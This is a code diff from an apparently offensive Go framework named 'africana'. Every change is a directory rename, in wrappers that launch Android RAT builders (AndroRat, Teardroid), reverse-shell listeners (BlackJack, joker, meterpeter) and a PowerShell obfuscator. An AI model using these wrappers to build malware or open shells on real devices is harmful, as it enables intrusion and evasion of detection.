@@ -17,11 +17,11 @@ func Havoc() {
 }
 
 func Shellz() {
-    subprocess.Popen(`cd ~/.africana/externals/shells/; bash shells`)
+    subprocess.Popen(`cd ~/.africana/africana-base/shells/; bash shells`)
 }
 
 func MeterPeter() {
-    subprocess.Popen(`cd ~/.africana/externals/meterpeter/; pwsh meterpeter.ps1`)
+    subprocess.Popen(`cd ~/.africana/africana-base/meterpeter/; pwsh meterpeter.ps1`)
 }
 
 func TearDroid() {
@@ -32,7 +32,7 @@ func TearDroid() {
     if userMalware == "" {
         userMalware = "africana.apk"
     }
-    subprocess.PopenTwo(`cd ~/.africana/externals/Teardroid-phprat/; python3 Teardroid.py -b %s`, userMalware)
+    subprocess.PopenTwo(`cd ~/.africana/africana-base/Teardroid-phprat/; python3 Teardroid.py -b %s`, userMalware)
 }
 
 func Chameleon() {
@@ -46,7 +46,7 @@ func Chameleon() {
     if userOutput == "" {
         userOutput = "~/.africana/output/chameleon.txt"
     }
-    subprocess.PopenThree(`cd ~/.africana/externals/chameleon/; python3 chameleon.py -a %s -o %s`, userScript, userOutput)
+    subprocess.PopenThree(`cd ~/.africana/africana-base/chameleon/; python3 chameleon.py -a %s -o %s`, userScript, userOutput)
 }
 
 func ChameLeon() {
@@ -60,7 +60,7 @@ func ChameLeon() {
     if userOutput == "" {
         userOutput = "~/.africana/output/chameleon.txt"
     }
-    subprocess.PopenThree(`cd ~/.africana/externals/chameleon/; pwsh -c "Import-Module ./chameleon.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o %s"`, userScript, userOutput)
+    subprocess.PopenThree(`cd ~/.africana/africana-base/chameleon/; pwsh -c "Import-Module ./chameleon.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o %s"`, userScript, userOutput)
 }
 
 func BlackJack() {
@@ -82,7 +82,7 @@ func BlackJack() {
         if userLport == "" {
             userLport = "9999"
         }
-        subprocess.PopenTwo(`cd ~/.africana/externals/blackjack/; python3 BlackJack.py -i -s -n %s`, userLport)
+        subprocess.PopenTwo(`cd ~/.africana/africana-base/blackjack/; python3 BlackJack.py -i -s -n %s`, userLport)
     case "2":
         fmt.Print(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.RED + "Lport:" + bcolors.BLUE + "Default:" + bcolors.YELLOW + "9999" + bcolors.GREEN + ")# " + bcolors.ENDC)
         reader := bufio.NewReader(os.Stdin)
@@ -97,7 +97,7 @@ func BlackJack() {
         if userHport == "" {
             userHport = "3333"
         }
-        subprocess.PopenThree(`cd ~/.africana/externals/blackjack/; python3 BlackJack.py -i -s -c /root/.africana/certs/africana-cert.pem -k /root/.africana/certs/africana-key.pem -x %s -n %s`, userLport, userHport)
+        subprocess.PopenThree(`cd ~/.africana/africana-base/blackjack/; python3 BlackJack.py -i -s -c /root/.africana/certs/africana-cert.pem -k /root/.africana/certs/africana-key.pem -x %s -n %s`, userLport, userHport)
     default:
         fmt.Println(bcolors.BLUE + "( " + bcolors.RED + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 to 2 " + bcolors.BLUE + ")" + bcolors.ENDC)
     }
@@ -124,7 +124,7 @@ func PowerJoker() {
     if userLport == "" {
         userLport = "9999"
     }
-    subprocess.PopenThree(`cd ~/.africana/externals/joker/; python3 joker.py -l %s -p %s`, userLhost, userLport)
+    subprocess.PopenThree(`cd ~/.africana/africana-base/joker/; python3 joker.py -l %s -p %s`, userLhost, userLport)
 }
 
 func AndroRat() {
@@ -135,7 +135,7 @@ func AndroRat() {
     }
     filePath := "/usr/bin/zipalign.bak_africana"
     if _, err := os.Stat(filePath); os.IsNotExist(err) {
-        subprocess.Popen(`mv /usr/bin/zipalign /usr/bin/zipalign.bak_africana; cd ~/.africana/externals/androrat; apt install ./zipalign_8.1.0.deb --allow-downgrades -y`)
+        subprocess.Popen(`mv /usr/bin/zipalign /usr/bin/zipalign.bak_africana; cd ~/.africana/africana-base/androrat; apt install ./zipalign_8.1.0.deb --allow-downgrades -y`)
     }
     fmt.Println()
     subprocess.Popen(`ip address`)
@@ -158,6 +158,6 @@ func AndroRat() {
     if userMalware == "" {
         userMalware = "africana.apk"
     }
-    subprocess.PopenFour(`cd ~/.africana/externals/androrat/; python3 androrat.py --build -i %s -p %s -o /root/.africana/output/%s`, userLhost, userLport, userMalware)
-    subprocess.PopenThree(`cd ~/.africana/externals/androrat/; python3 androrat.py --shell -i %s -p %s`, userLhost, userLport)
+    subprocess.PopenFour(`cd ~/.africana/africana-base/androrat/; python3 androrat.py --build -i %s -p %s -o /root/.africana/output/%s`, userLhost, userLport, userMalware)
+    subprocess.PopenThree(`cd ~/.africana/africana-base/androrat/; python3 androrat.py --shell -i %s -p %s`, userLhost, userLport)
 }
